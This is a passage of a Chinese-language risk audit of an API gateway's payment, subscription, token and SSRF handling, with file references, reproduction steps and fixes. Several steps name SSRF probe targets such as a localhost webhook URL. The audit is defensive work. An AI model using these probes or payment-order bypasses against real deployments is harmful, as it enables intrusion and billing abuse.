  - 硬删除用户前必须处理 `user_oauth_bindings`、Passkey、2FA/备用码、token、订阅、订单、OAuth 字段和 access token；至少要归档快照并清理会阻断重绑的唯一键。
  - 所有 `Is*AlreadyTaken` 统一语义：要么只看活跃用户，要么返回占用者状态并要求人工处理；不要让 OIDC 与其他身份策略不一致。
  - `FillUserBy*Id` 必须返回真实查询错误；OAuth/Passkey 登录遇到软删除/硬删除用户时应返回明确的 `deleted_user`/`needs_recovery`，而不是吞错或依赖零值状态。
  - 用户恢复流程应恢复或重新确认身份绑定、安全因子和 token，而不是简单清空 `deleted_at`。
  - 所有释放/解绑/恢复动作写结构化管理日志，记录管理员、原因、外部 provider、provider_user_id 哈希、旧 user_id、新 user_id 和工单号。
- 优先级：P1。
- 当前状态：未修复。

### 风险 277：已删除用户的旧 dashboard session 仍可在部分普通充值入口新建 pending 支付订单

- 标题：`UserAuth` 不回源 DB 导致已软删除/硬删除用户的旧 cookie session 仍可进入充值路由；Stripe、Creem 普通充值创建订单时忽略 `GetUserById` 错误，Epay 普通充值只读取 `GetUserGroup` 且 0 行命中不报错，因此删除后的旧 session 仍可能新建 pending 充值订单。用户随后真实支付会把风险 272/115 的“已付款但目标用户不存在/未到账”从“删除前已有订单”扩展成“删除后还能新下单”。
- 影响范围：普通充值、Stripe Checkout、Creem Checkout、Epay 易支付、旧 dashboard session、软删除/硬删除用户、`top_ups` pending/success 状态、支付回调、用户 quota、收入统计、客服 paid/no-credit 争议。
- 触发条件：
  - 用户登录后保留 cookie session，随后被管理员软删除或硬删除；风险 67 说明旧 session 仍可能通过 `UserAuth`。
  - 站点支付合规已确认，且对应普通充值方式启用。
  - 旧 session 调用 `/api/user/stripe/pay`、`/api/user/creem/pay` 或 `/api/user/pay` 创建普通充值订单。
  - 控制器没有重新确认当前 users 表中存在 `deleted_at IS NULL` 且 `status=enabled` 的用户。
- 涉及文件/函数：
  - `router/api-router.go:80-108`：普通充值相关路由位于 `selfRoute.Use(middleware.UserAuth())` 之后，依赖 dashboard session 鉴权。
  - `middleware/auth.go:36-165`：`UserAuth` 的 `authHelper` 直接信任 cookie session 中的 `id/status`，不回源 DB 确认用户仍存在。
  - `controller/payment_compliance.go:22-28`：`requirePaymentCompliance` 只检查全局支付合规确认，不检查当前用户存在性或状态。
  - `controller/topup_stripe.go:89-118`：Stripe 普通充值 `user, _ := model.GetUserById(id, false)` 忽略错误，随后使用 `*user` 计算金额、生成 checkout session，并插入 `top_ups` pending 订单。
  - `controller/topup_creem.go:101-133`：Creem 普通充值同样忽略 `GetUserById` 错误，使用返回的 user 零值/残留值生成 `referenceId` 和 pending `top_ups` 订单。
  - `controller/topup.go:203-245`：Epay 普通充值调用 `model.GetUserGroup(id, true)` 后只看 error；底层使用 `Find(&group)`，用户不存在时也可能返回空 group 而非错误，随后继续生成 `top_ups` pending 订单。
  - `model/user.go:941-965`：`GetUserGroup` DB fallback 使用 `Find(&group).Error`，0 行命中不产生 `ErrRecordNotFound`，并可能异步把空 group 写入 cache。
  - `controller/topup_waffo.go:150-154` 与 `controller/topup_waffo_pancake.go:365-369`：Waffo/Waffo Pancake 普通充值显式检查 `GetUserById` error/user nil，是正向对比。
  - `controller/subscription_payment_stripe.go:57-64`、`controller/subscription_payment_creem.go:63-70`、`controller/subscription_payment_waffo_pancake.go:56-63`：订阅购买入口也显式检查当前用户存在，是正向对比。
  - `docs/newapi-ops-risk-audit.md:8818-8837`：风险 272 覆盖支付回调完成时未确认目标用户存在；本风险覆盖更早的“删除后仍能创建新支付订单”。
  - `docs/newapi-ops-risk-audit.md:9201-9217`：此前确认 access token 回源删除用户会失败，但 dashboard cookie session 仍是残留入口。
- 可能后果：
  - 已删除用户仍能通过旧浏览器会话拉起 Stripe/Creem/Epay 支付并获得真实支付链接；运营以为删除账号已阻止继续充值，实际仍可产生新订单。
  - 用户支付成功后，Stripe/Creem/Epay webhook 可能把 `top_ups` 标记 success，但用户主记录不存在，额度不入账、`topup_money` 刷新失败或没有有效目标。
  - 收入统计可能计入 success 订单，客服看到的是“删除后创建、第三方已付、本地 success、用户不存在/未到账”的更难解释争议。
  - Epay 路径可能按空 group/default 口径计算 payMoney，造成删除用户下单时的折扣/分组价格不可信。
  - 修复风险 272 时如果只在 webhook 完成阶段处理 `user_missing`，仍会让已删除用户继续创建付款意图，增加支付侧退款和客服工单。
- 复现思路：
  - 本地用户登录并保留 cookie session，后台软删除或硬删除该用户。
  - 使用旧 session 请求 Stripe/Creem/Epay 普通充值下单接口，观察是否仍返回 `pay_link/checkout_url/epay params` 并写入 pending `top_ups`。
  - 对比 Waffo/Waffo Pancake 普通充值和订阅支付入口，验证它们在 `GetUserById` 失败时拒绝下单。
  - 只使用本地测试支付配置或 mock，不调用真实第三方支付完成付款。
- 修复建议：
  - 所有支付下单入口在创建 provider session 或本地订单前必须调用统一 `EnsureActiveUserForPayment(c)`：确认 users 行存在、未软删除、`Status == enabled`，并读取最新 group/email/customer id。
  - `UserAuth` 修复为会话版本/DB 状态校验后，支付入口仍应保留自己的 active-user gate，避免未来其它鉴权方式复用时漏掉。
  - `GetUserGroup`、`GetUserQuota`、`GetUserUsedQuota` 等单字段读取不能用 `Find` 静默接受 0 行；用户不存在应返回 `ErrRecordNotFound`。
  - Stripe/Creem/Epay 下单失败时不要先创建本地订单；如果 provider session 已创建但本地用户校验失败，应丢弃或标记 `blocked_user_missing`，不可返回给用户继续付款。
  - 支付前端应在用户被删除/禁用/会话过期时强制重新登录；后端返回明确 `user_deleted/session_invalid`。
  - 风险 272 的 webhook 修复仍必须保留：即使下单入口修复，历史 pending 订单仍可能在用户删除后回调。
- 优先级：P1。
- 当前状态：未修复。

### 风险 278：普通充值下单入口未统一校验支付合规状态，可能创建“已付款但 webhook 被合规开关拒绝”的订单

- 标题：支付合规确认只集中在展示开关、webhook availability、订阅支付和部分资产操作中；普通充值的 Stripe、Creem、Epay、Waffo 下单入口没有统一调用 `requirePaymentCompliance`。当合规确认未完成、版本失效或被重置时，用户仍可能绕过前端直接创建第三方支付订单；随后 webhook 因 `is*WebhookEnabled()` 返回 false 被拒，形成 paid/no-credit 争议。
- 影响范围：普通充值、Epay、Stripe Checkout、Creem Checkout、Waffo、支付合规开关、webhook 可用性、`top_ups` pending/success 状态、第三方已付款但本地不入账、退款与客服对账。
- 触发条件：
  - 站点曾经配置过支付密钥、Epay 支付方式、Stripe Price、Creem 产品或 Waffo 凭证。
  - 合规确认当前为 false，或后续版本变更导致 `operation_setting.IsPaymentComplianceConfirmed()` 返回 false。
  - 用户绕过前端展示，直接调用普通充值 pay 接口；或旧前端/缓存页面仍保留支付入口。
  - 对应 pay 控制器没有在创建 provider session/本地订单前调用 `requirePaymentCompliance` 或 `is*TopUpEnabled`。
- 涉及文件/函数：
  - `controller/payment_compliance.go:22-28`：统一合规 gate 已存在，但普通充值 pay/amount 入口未复用。
  - `controller/payment_webhook_availability.go:14-109`：`isStripeTopUpEnabled`、`isCreemTopUpEnabled`、`isWaffoTopUpEnabled`、`isWaffoPancakeTopUpEnabled`、`isEpayTopUpEnabled` 均把合规确认作为启用条件；webhook 入口也依赖这些函数。
  - `controller/topup.go:24-123`：`GetTopUpInfo` 使用 `is*TopUpEnabled` 控制前端展示；这是正向展示 gate，但不是下单 gate。
  - `controller/topup.go:189-265`：Epay 普通充值下单未调用 `requirePaymentCompliance` 或 `isEpayTopUpEnabled`，只检查金额、用户分组、`ContainsPayMethod` 和 `GetEpayClient`。
  - `controller/topup.go:310-323`：Epay webhook 在 `!isEpayWebhookEnabled()` 时直接拒绝；合规 false 会让已经付款的回调进不来。
  - `controller/topup_stripe.go:64-124` 与 `controller/topup_stripe.go:137-145`：Stripe 普通充值下单未调用 `requirePaymentCompliance` 或 `isStripeTopUpEnabled`，只要 `genStripeLink` 所需配置可用就可能创建 Checkout Session。
  - `controller/topup_stripe.go:147-152`：Stripe webhook 在 `!isStripeWebhookEnabled()` 时拒绝；合规 false 会阻断后续入账。
  - `controller/topup_creem.go:66-141` 与 `controller/topup_creem.go:144-165`：Creem 普通充值下单未调用 `requirePaymentCompliance` 或 `isCreemTopUpEnabled`，会按 `setting.CreemProducts` 创建支付链接和 pending 订单。
  - `controller/topup_creem.go:230-233`：Creem webhook 在 `!isCreemWebhookEnabled()` 时拒绝。
  - `controller/topup_waffo.go:132-195`：Waffo 普通充值下单只检查 `setting.WaffoEnabled`，没有检查合规确认或 `isWaffoTopUpEnabled`。
  - `controller/topup_waffo.go:320-323`：Waffo webhook 在 `!isWaffoWebhookEnabled()` 时拒绝。
  - `controller/topup_waffo_pancake.go:348-352`：Waffo Pancake 下单调用 `isWaffoPancakeTopUpEnabled`，是本轮正向对比。
  - `controller/subscription_payment_stripe.go:24`、`controller/subscription_payment_creem.go:24`、`controller/subscription_payment_waffo_pancake.go:24`、`controller/subscription_payment_epay.go:25`：订阅支付入口调用 `requirePaymentCompliance`，证明普通充值缺少同等 gate。
  - `controller/option.go:140-150`：通用设置只对邀请奖励和合规字段本身做特殊限制，没有在普通充值 pay 路由执行时兜底。
- 可能后果：
  - 合规未确认时前端可能显示关闭，但攻击者或旧页面仍能直调 pay 接口拿到第三方支付链接。
  - 用户完成真实付款后，webhook 因合规 false 被 403 拒绝，本地 pending 订单不入账，支付平台可能持续重试或最终需要人工退款。
  - 运营以为合规开关已经阻止收费，实际仍能产生第三方收款和客服争议。
  - 如果管理员因合规条款版本升级临时变为未确认，历史已配置支付方式会变成“可下单但不可回调”的半关闭状态。
  - 风险 277 的删除用户旧 session 下单问题会被放大：即使展示关闭或合规未确认，直调路径仍可能创建支付意图。
- 复现思路：
  - 本地配置 Stripe/Creem/Epay/Waffo 的测试参数，并保留历史支付方式/产品配置。
  - 将 `payment_setting.compliance_confirmed` 或 terms version 调整为未确认状态。
  - 直接请求 `/api/user/stripe/pay`、`/api/user/creem/pay`、`/api/user/pay`、`/api/user/waffo/pay`，观察是否仍创建 provider checkout 或本地 pending 订单。
  - 再请求对应 webhook 或阅读代码路径，确认 `is*WebhookEnabled()` 会因合规 false 拒绝回调。
  - 全程只用本地/mock/test mode，不向真实生产支付账户发起交易。
- 修复建议：
  - 所有普通充值 pay 和 amount-preview 入口开头统一调用 `requirePaymentCompliance`；pay 入口还应调用对应 `is*TopUpEnabled`，失败时禁止创建 provider session 和本地订单。
  - 把 `requirePaymentCompliance + EnsureActiveUserForPayment + isGatewayTopUpEnabled` 封装成单一 payment preflight，普通充值和订阅购买共用。
  - 合规状态变为 false 或 terms version 失效时，应显式阻断新下单，同时保留历史 webhook 处理策略：对已经创建的 pending 订单可允许受控完成、转人工或标记 `compliance_blocked`，避免用户已付款却直接 403。
  - `GetTopUpInfo`、前端展示、pay 接口、webhook availability 必须使用同一套状态机；不要出现“展示关闭、下单可用、回调拒绝”的三分裂。
  - 为合规状态变更增加审计日志和 pending 订单检查，提示管理员当前是否存在可能受影响的未完成订单。
- 优先级：P1。
- 当前状态：未修复。

## P2

### 风险 9：用户自助邀请额度转余额直接写 DB，不刷新用户额度缓存

- 标题：`TransferAffQuotaToQuota` 事务内调整 `quota/aff_quota` 后没有同步 Redis 用户缓存
- 影响范围：邀请返利转余额、Redis 缓存、用户自助余额可用性
- 触发条件：Redis 用户缓存已存在；用户将 `aff_quota` 转入 `quota`
- 涉及文件/函数：
  - `controller/user.go:358-379`：用户自助调用 `TransferAffQuota`
  - `model/user.go:466-500`：事务内 `user.AffQuota -= quota`、`user.Quota += quota` 并 `tx.Save(user)`
  - `model/user.go:906-925`：后续余额读取优先走缓存
- 可能后果：转入成功后，缓存中的 `Quota` 仍是旧值，用户短时无法使用刚转入的额度；若缓存和 DB 长期不一致，也会影响预扣费和余额展示。
- 复现思路：启用 Redis，先缓存用户额度，再执行邀请额度转余额；立即调用余额校验接口，观察是否仍读取旧余额。
- 修复建议：事务提交成功后调用 `cacheIncrUserQuota` 或统一刷新用户缓存；同时为转移操作补充 LogTypeTopup/LogTypeManage 之外的可审计日志。
- 优先级：P2
- 当前状态：已确认存在缓存刷新缺口，尚未修复。

### 风险 14：订阅用量回退函数把负数用量静默夹到 0，可能掩盖重复退款或错误差额

- 标题：`PostConsumeUserSubscriptionDelta` 对过量负 delta 不报错，只把 `AmountUsed` 归零
- 影响范围：订阅套餐预扣、失败退款、任务差额结算、审计日志和异常发现
- 触发条件：调用方传入大于当前已用量的负 delta；或未来新增退款路径绕过 `SubscriptionPreConsumeRecord` 的幂等保护
- 涉及文件/函数：
  - `model/subscription.go:1073-1175`：`PreConsumeUserSubscription` 使用 `request_id` 记录预扣，整体具备幂等设计
  - `model/subscription.go:1177-1200`：`RefundSubscriptionPreConsume` 通过记录状态避免重复退款
  - `model/subscription.go:1246-1253`：旧预扣记录会被清理
  - `model/subscription.go:1285-1309`：`PostConsumeUserSubscriptionDelta` 在 `newUsed < 0` 时直接设为 0
- 可能后果：当前 `RefundSubscriptionPreConsume` 主路径有记录幂等保护，直接重复退款风险较低；但这个底层函数本身会吞掉过量退款信号，未来其他调用方或异常差额结算可能把订阅已用量错误清零，审计上只能看到最终为 0，难以及时定位重复退款或结算错误。
- 复现思路：本地构造订阅 `AmountUsed=100`，直接调用 `PostConsumeUserSubscriptionDelta(subId, -200)`；观察函数返回成功且 `AmountUsed=0`，没有错误或审计记录。
- 修复建议：负 delta 超过当前 `AmountUsed` 时返回错误并记录告警；如果确实需要归零，应提供显式 `ResetSubscriptionUsage` 管理函数并记录管理员/任务/请求来源。
- 优先级：P2
- 当前状态：已确认存在审计盲点；主退款路径有幂等记录，风险低于直接入账/扣费问题。

### 风险 17：禁用/过期/耗尽 token 仍可访问 usage 和 token 日志只读接口，泄露面在 token 泄漏后仍保留

- 标题：`TokenAuthReadOnly` 明确不检查 token 状态、过期时间和额度，但可访问 token usage 与 token log
- 影响范围：token 使用量、消费日志、模型名、请求时间、额度信息、用户运营隐私
- 触发条件：token 曾经泄漏，用户发现后仅禁用 token、让 token 过期或耗尽额度，但没有删除 token 或封禁用户
- 涉及文件/函数：
  - `middleware/auth.go:210-213`：只读 token 认证说明不检查状态、过期时间和额度
  - `middleware/auth.go:232-272`：只校验 token key 存在和用户未封禁
  - `router/api-router.go:290-297`：`/api/usage/token` 使用 `TokenAuthReadOnly`
  - `controller/token.go:118-164`：`GetTokenUsage` 返回 token 名称、剩余额度、已用额度、模型限制等信息
  - `router/api-router.go:327-330`：`/api/log/token` 使用 `TokenAuthReadOnly`
  - `controller/log.go:74-96`：`GetLogByKey` 按 token id 返回日志
- 可能后果：禁用 token 虽然不能继续消费，但泄漏方仍可查询该 token 的用量和历史日志，获得用户调用模型、额度变化和消费时间线。对企业用户或代理场景，这属于持续的数据泄露面。
- 复现思路：创建 token 并产生消费日志；禁用 token 或设置过期；继续用原 token 请求 `/api/usage/token` 和 `/api/log/token`，观察是否仍返回数据。
- 修复建议：默认只允许 enabled 且未过期 token 查询 usage/log；若要兼容 OpenAI credit summary，可只暴露最小余额信息，不返回日志和模型限制细节。删除 token 后应确保 Redis 缓存失效。
- 优先级：P2
- 当前状态：已确认只读认证有意放宽状态校验，是否调整需结合产品兼容性决定。

### 风险 25：订阅套餐自定义时长可保存为无效值，购买/兑换/后台绑定阶段才失败

- 标题：套餐创建/更新未校验 `duration_unit=custom` 时 `custom_seconds > 0`
- 影响范围：订阅套餐、支付下单、兑换码套餐兑换、管理员绑定套餐、运营配置
- 触发条件：管理员创建或更新自定义时长套餐，但 `custom_seconds <= 0`
- 涉及文件/函数：
  - `controller/subscription.go:143-148`、`controller/subscription.go:224-229`：非 custom 时会修正 `DurationValue`，但未校验 custom 的 `CustomSeconds`
  - `controller/subscription.go:178-181`、`controller/subscription.go:259-263`：只对重置周期 custom 校验秒数
  - `model/subscription.go:282-305`：实际创建用户订阅时，`calcPlanEndTime` 才拒绝 `custom_seconds <= 0`
  - `model/redemption.go:174-181`、`model/subscription.go:547-607`：兑换/订单完成/后台绑定最终都会走创建订阅并触发该失败
- 可能后果：后台可以保存一个看似可用的无效套餐；用户支付前或兑换时才失败，造成订单创建失败、兑换码不可用或后台绑定报错。若套餐已对外展示，会形成运营事故和客服问题。
- 复现思路：后台创建 `duration_unit=custom`、`custom_seconds=0` 的套餐；尝试用户购买、兑换码兑换或管理员绑定该套餐，观察 `custom_seconds must be > 0` 类错误。
- 修复建议：套餐创建/更新时直接校验 custom duration 秒数，并在前端同步禁用非法保存；对现有无效套餐增加启动/管理页巡检提示。
- 优先级：P2
- 当前状态：已确认保存阶段缺少 custom duration 校验，尚未修复。

### 风险 30：订阅价格金额列迁移失败只打印 warning，启动仍继续，可能留下 float/double 价格列

- 标题：`subscription_plans.price_amount` 迁移到 `decimal(10,6)` 失败不会阻断启动或进入降级状态
- 影响范围：订阅套餐价格、订阅支付订单、Creem/Stripe/Epay/Waffo 订阅金额、运营价格展示和支付对账
- 触发条件：MySQL/PostgreSQL 迁移权限不足、表锁/DDL 失败、历史数据不能转换、metadata 查询失败但继续执行后续逻辑
- 涉及文件/函数：
  - `model/subscription.go:153`：`PriceAmount` 期望为 `decimal(10,6)`
  - `model/main.go:250-252`：启动迁移时调用 `migrateSubscriptionPlanPriceAmount`
  - `model/main.go:527-583`：迁移函数查询或 ALTER 失败都只 `SysLog("Warning: ...")`，不向 `migrateDB` 返回错误
  - `controller/subscription_payment_stripe.go:84`、`controller/subscription_payment_creem.go:84-109`、`controller/subscription_payment_epay.go:82-97`、`controller/subscription_payment_waffo_pancake.go:77-95`：订阅支付直接使用 `plan.PriceAmount` 创建订单
- 可能后果：新版本代码以 decimal 价格建模，但旧库仍保留 float/double 精度和舍入行为；部分金额可能展示、下单、回调对账出现分位差。更严重的是迁移失败被普通启动日志淹没，运营以为金额列已修复，实际仍使用旧精度。
- 复现思路：在无 ALTER 权限的数据库账号下启动服务，观察服务仍继续运行；检查 `subscription_plans.price_amount` 实际列类型和订阅支付订单金额格式。
- 修复建议：关键金额列迁移失败应返回错误并阻断启动，或至少进入只读/禁止订阅支付模式；提供显式健康检查暴露金额列类型；迁移前后做数据校验和备份；订阅支付回调继续校验实付金额、币种和本地订单金额。
- 优先级：P2
- 当前状态：已确认迁移失败不返回错误，尚未修复。

### 风险 37：用户通知 URL 保存阶段只做格式校验，运行时安全依赖全局 SSRF 配置，配置漂移后普通用户可变成出站探测入口

- 标题：普通用户可保存 Webhook/Bark/Gotify 出站 URL；保存时不按当前 `fetch_setting` 预校验，Webhook 甚至未限制 http/https，实际拦截推迟到发送阶段
- 影响范围：用户余额告警通知、订阅额度告警通知、服务器出站请求、内网探测、日志噪声和通知失败重试/排障
- 触发条件：普通用户把通知地址设置为内网、云元数据、非标准端口、DNS rebinding 域名或恶意外部地址；Root 后续关闭/放宽 `fetch_setting.enable_ssrf_protection`、`allow_private_ip`、端口列表或域名/IP 策略；余额/订阅额度低于阈值触发通知
- 涉及文件/函数：
  - `router/api-router.go:109-110`：普通登录用户可 `PUT /api/user/setting`
  - `controller/user.go:1187-1197`：Webhook URL 只 `url.ParseRequestURI`，没有限制 scheme，也没有按 SSRF 策略校验
  - `controller/user.go:1209-1247`：Bark/Gotify 只检查格式和 http/https，保存时不校验内网/端口/域名策略
  - `controller/user.go:1270-1303`：URL 写入用户设置并持久化
  - `service/quota.go:452-497`、`service/quota.go:500-545`：额度不足时异步触发 `NotifyUser`
  - `service/webhook.go:91-95`、`service/user_notify.go:156-159`、`service/user_notify.go:250-253`：运行时才按当前 `fetch_setting` 校验
  - `setting/system_setting/fetch_setting.go:16-25`：默认启用 SSRF 防护，但这些配置可由 Root 后台调整
- 可能后果：当前默认配置能拦截多数内网目标，但危险 URL 可以长期躺在用户设置里；一旦 Root 为了排障放宽全局抓取策略，普通用户预置的 URL 会在下一次额度通知时变成服务器出站探测/请求入口。由于通知异步触发，问题定位会很困难。
- 复现思路：普通用户保存 `webhook_url=http://127.0.0.1:8080/x` 或 DNS rebinding 域名；默认配置下触发通知应被运行时拦截。再放宽 `fetch_setting` 后触发低余额通知，观察服务端是否开始请求该地址。
- 修复建议：保存通知设置时就按当前 SSRF 策略预校验，Webhook 也强制 http/https；对已保存 URL 在策略变更时做巡检/失效；运行时仍保留校验。用户可控出站 URL 建议增加专门开关、域名白名单和失败告警脱敏。
- 优先级：P2
- 当前状态：已确认保存阶段与运行阶段校验不一致，尚未修复。

### 风险 42：跨渠道重试只记录最终成功渠道费用，失败但可能已被上游计费的尝试没有成本账

- 标题：普通 relay 和 task relay 的 retry 循环只在最终成功后结算，失败尝试仅处理错误和自动禁用；如果上游已生成成本但返回超时/5xx/连接中断，本地无法记录该渠道成本
- 影响范围：渠道成本、渠道利润率、自动禁用判断、上游账单对账、跨渠道重试、异步任务重复提交
- 触发条件：第一次上游请求被处理或部分处理后返回 retryable 错误、超时、连接中断或 5xx；系统切换到另一渠道重试并成功；异步任务提交时上游实际创建任务但本地收到错误并重试
- 涉及文件/函数：
  - `controller/relay.go:220-236`：普通 relay 出错后只 `processChannelError` 并判断 `shouldRetry`，没有记录失败尝试的潜在成本
  - `controller/relay.go:549-563`：异步任务提交出错后可继续重试；失败尝试没有任务记录和成本记录
  - `controller/relay.go:238-242`、`controller/relay.go:566-570`：只记录重试链路日志，不形成可对账成本流水
  - `controller/relay.go:356-363`、`service/channel.go:45-64`：失败尝试可能触发自动禁用，但成本侧仍没有对应记录
- 可能后果：上游已经扣费或创建任务，但本地只向用户收取最终成功渠道的费用，导致渠道账单大于平台记录成本；异步任务场景还可能在多个上游创建任务，最终只保留一个本地任务。长期看会造成毛利异常、渠道误判和难以解释的第三方账单差异。
- 复现思路：用测试上游模拟“已处理请求但返回 502/超时”，然后让系统重试到第二渠道成功；检查本地消费日志和渠道 used_quota 是否只记录第二渠道，第一渠道仅有错误日志或自动禁用记录。
- 修复建议：为每次上游尝试生成 attempt id 和成本状态；对 retryable 错误至少记录“潜在成本/待对账”流水，异步任务提交应保存幂等键或上游返回的任务号后再决定是否重试。对超时后重试的模型类型增加运营开关和告警，避免无界成本泄漏。
- 优先级：P2
- 当前状态：已确认 retry 循环没有失败尝试成本账或任务锚点，尚未修复。

### 风险 43：倍率同步自定义上游可请求任意 URL，且直接信任上游返回的计费字段用于差异展示

- 标题：Root-only `/api/ratio_sync/fetch` 对 `BaseURL`/`Endpoint` 只检查 `http` 前缀，不走 SSRF 策略；返回数据可包含 `model_ratio`、`model_price`、`billing_expr` 等高危计费字段
- 影响范围：Root 后台倍率同步、模型价格配置、阶梯计费表达式、服务端出站请求、内网地址、运营误操作
- 触发条件：Root 在倍率同步中填写自定义上游；Root 账号被盗；运营从不可信实例/静态地址拉取 pricing/ratio_config；上游返回恶意或错误倍率、固定价格、阶梯表达式
- 涉及文件/函数：
  - `router/api-router.go:227-232`：倍率同步接口位于 RootAuth 分组
  - `controller/ratio_sync.go:142-164`：自定义 `req.Upstreams` 只要求 `BaseURL` 以 `http` 开头，并拼入待请求列表
  - `controller/ratio_sync.go:199-218`：自建 `http.Transport` 和 `http.Client`，没有调用 `ValidateURLWithFetchSetting`
  - `controller/ratio_sync.go:230-287`：`Endpoint` 可为完整 URL，随后直接 `client.Do(httpReq)`
  - `controller/ratio_sync.go:341-491`：解析上游 `model_ratio`、`completion_ratio`、`cache_ratio`、`model_price`、`billing_mode`、`billing_expr` 等字段
  - `controller/ratio_sync.go:525-533`、`controller/ratio_sync.go:620-695`：把差异返回给前端供运营决策；当前扫描未发现该函数内直接落库
- 可能后果：Root 级功能可被用作服务端出站探测；更重要的是，不可信上游可提供极低倍率、负值/异常价格或复杂 `billing_expr`，诱导运营同步错误计费配置，造成大面积少扣费、多扣费或套餐成本失真。虽然当前看到的是差异展示而非直接保存，但这是高风险运营入口。
- 复现思路：本地调用倍率同步接口，传入 `BaseURL=http://127.0.0.1:...` 或 `Endpoint=http://127.0.0.1:.../api/pricing`；观察服务端是否请求该地址并把返回的计费字段展示为差异。
- 修复建议：倍率同步所有 URL 统一走 `fetch_setting` SSRF 校验，禁止私网/元数据地址和非白名单端口；对返回的倍率、固定价和表达式做范围校验、签名/来源标识和人工二次确认；同步前生成变更 diff 审计，落库入口必须要求 Root 二次验证。
- 优先级：P2
- 当前状态：已确认倍率同步 fetch 路径无 SSRF 校验且解析高危计费字段；未确认该路径直接落库。

### 风险 44：渠道余额同步直接写入上游返回值，异常余额可触发误禁用或污染运营判断

- 标题：余额查询解析出的 float64 未做非负、有限值、上限和来源可信校验；批量更新中 `balance <= 0` 会自动禁用渠道
- 影响范围：渠道余额展示、批量余额同步、自动禁用渠道、渠道可用性、运营监控和告警
- 触发条件：上游余额接口返回负数、0、异常大值、格式可解析但不可信的余额；Custom/OpenAI baseURL 指向兼容但恶意的接口；第三方余额接口临时异常返回 0；管理员触发单个或批量余额更新
- 涉及文件/函数：
  - `controller/channel-billing.go:139-151`：`GetResponseBody` 对余额 URL 发起请求，没有在这里做初始 URL 安全校验
  - `controller/channel-billing.go:169-355`：多个 provider 分支解析余额后直接 `channel.UpdateBalance(...)`
  - `controller/channel-billing.go:359-421`：OpenAI/Custom 分支用订阅 hard limit 减 usage 后直接写余额
  - `model/channel.go:585-589`：`UpdateBalance` 直接更新 `balance` 和 `balance_updated_time`
  - `controller/channel-billing.go:454-480`：批量余额更新时，`balance <= 0` 会调用 `service.DisableChannel(..., "余额不足")`
- 可能后果：错误的 0 或负数余额会把正常渠道自动禁用，造成流量切换和可用性下降；异常大余额会掩盖实际欠费风险；恶意兼容接口可污染后台余额展示。该风险更偏运营可用性，但会间接影响成本控制和请求路由。
- 复现思路：本地把 Custom/OpenAI 兼容 baseURL 指向测试服务，让余额接口返回 hard limit 小于 usage 或返回 0；触发 `/api/channel/update_balance` 或批量更新，观察余额被写入以及批量路径是否禁用渠道。
- 修复建议：余额写入前做 `math.IsFinite`、非负、合理上限和 provider 状态校验；批量自动禁用前要求连续多次低余额或 provider 明确欠费状态，不能只依赖一次解析值。余额异常应记录为“查询失败/不可信”，不应覆盖上次可信余额。
- 优先级：P2
- 当前状态：已确认余额同步缺少范围校验且批量路径会按 `balance <= 0` 自动禁用，尚未修复。

### 风险 48：已存在订阅的重置周期被改成 `never` 后，过期的 `next_reset_time` 不会清空，维护任务可能反复扫描同一批记录

- 标题：`ResetDueSubscriptions` 选中到期重置记录后调用 `maybeResetUserSubscriptionWithPlanTx`；如果套餐当前重置周期为 `never`，函数直接返回，不更新 `next_reset_time`，但外层仍计数
- 影响范围：订阅重置定时任务、数据库负载、维护 goroutine、订阅额度重置、后台套餐编辑
- 触发条件：套餐原本有 daily/weekly/monthly/custom 重置，用户订阅已生成 `next_reset_time`；管理员后来把套餐 `quota_reset_period` 改为 `never`；该订阅的 `next_reset_time` 到期
- 涉及文件/函数：
  - `controller/subscription.go:259-288`：管理员可更新套餐 `quota_reset_period` 和 `quota_reset_custom_seconds`
  - `model/subscription.go:1203-1244`：`ResetDueSubscriptions` 查询 `next_reset_time > 0 AND next_reset_time <= ? AND status='active'`
  - `model/subscription.go:1226-1237`：即使 `maybeReset...` 没有实际更新，也会 `resetCount++`
  - `model/subscription.go:1037-1045`：重置周期为 `never` 时直接返回，不清空或推进 `next_reset_time`
  - `service/subscription_reset_task.go:70-82`：维护任务按返回数量循环；如果每批都返回 batch size，可能持续重复处理
- 可能后果：同一批订阅每分钟都会被扫描；如果数量达到 batch size，单次维护循环可能持续重复处理同一批记录，造成数据库和 CPU 压力。更隐蔽的是运营会看到“重置任务运行了”，但这些订阅的重置状态没有被修正。
- 复现思路：创建带 daily/custom reset 的套餐并生成订阅，手动把 `next_reset_time` 调到过去；再把套餐重置周期改成 `never`；触发 `ResetDueSubscriptions(300)`，观察返回计数和 `next_reset_time` 是否仍停留在过去。
- 修复建议：当计划周期变为 `never` 时批量清理该 plan 下 active subscriptions 的 `next_reset_time`；`maybeReset...` 在 period never 时应把 `next_reset_time=0` 持久化。`ResetDueSubscriptions` 只应在实际 RowsAffected/状态变化时计数，避免维护循环被虚假进度驱动。
- 优先级：P2
- 当前状态：已确认重置周期变更后存在重复扫描/虚假进度窗口，尚未修复。

### 风险 49：订阅过期/重置维护只依赖本地 `IsMasterNode` 和进程内 CAS，没有数据库级租约或健康补偿

- 标题：订阅维护任务只在 `common.IsMasterNode` 进程启动，本进程用 `atomic.Bool` 防重入；如果没有 master 或多个实例都被配置为 master，缺少 DB 级调度租约和执行审计
- 影响范围：订阅过期、周期额度重置、预扣记录清理、用户组降级、集群部署、主节点切换
- 触发条件：单实例配置 `IsMasterNode=false`；多实例部署中两个节点都认为自己是 master；master 节点长时间挂掉但业务节点继续提供 API；系统时钟漂移
- 涉及文件/函数：
  - `main.go:117-120`：启动时调用 `StartSubscriptionQuotaResetTask`
  - `service/subscription_reset_task.go:29-44`：只有 `common.IsMasterNode` 为 true 才启动 ticker
  - `service/subscription_reset_task.go:47-52`：只用进程内 `subscriptionResetRunning` 防止本进程重入
  - `service/subscription_reset_task.go:56-89`：过期、重置、清理都在本地循环执行，没有任务租约、心跳或执行结果落库
  - `model/subscription.go:926-1010`、`model/subscription.go:1203-1244`：模型层有条件更新降低部分重复执行风险，但不能证明任务一定被执行
- 可能后果：没有 master 时，过期订阅不会及时失效，周期额度不会重置或清理，用户组也不会按时降级；多个 master 时虽然部分更新有条件保护，但会增加 DB 压力并放大风险 48 的重复扫描问题。运营侧缺少“订阅维护最后成功时间”的审计，问题可能直到用户投诉才发现。
- 复现思路：本地把所有实例配置为非 master 后启动，创建已到期订阅，观察不会自动过期；或启动两个 master，观察两个进程都执行维护循环且没有 DB 租约记录。
- 修复建议：引入数据库/Redis 分布式锁或租约表，记录任务名、owner、lease_until、last_success_at、processed_count 和错误；业务请求读取订阅时也可做轻量惰性过期/重置兜底。后台应展示订阅维护健康状态并在超时未执行时告警。
